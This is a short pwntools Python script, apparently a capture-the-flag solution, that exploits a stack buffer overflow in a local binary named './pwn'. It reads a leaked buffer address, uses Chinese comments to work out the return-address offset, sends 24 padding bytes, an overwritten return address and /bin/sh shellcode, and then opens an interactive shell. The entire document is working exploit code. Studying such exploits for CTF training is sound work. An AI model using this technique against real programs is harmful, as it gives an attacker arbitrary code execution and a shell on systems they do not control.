from pwn import *
import re

# context.log_level = "debug"
context.arch = 'amd64'

p = process("./pwn")

buf_addr = p.recvuntil(b"]")
buf_addr = int(buf_addr[-15: -1], 16)  # buf 的地址
shellcode_addr = buf_addr + 32  # shellcode 的地址 = buf与rbp的距离16 + rbp的宽度8 + 返回地址的长度8


shellcode = asm(shellcraft.sh())

payload = b'a' * 24 + p64(shellcode_addr) + shellcode
p.recv()
p.sendline(payload)
p.interactive()
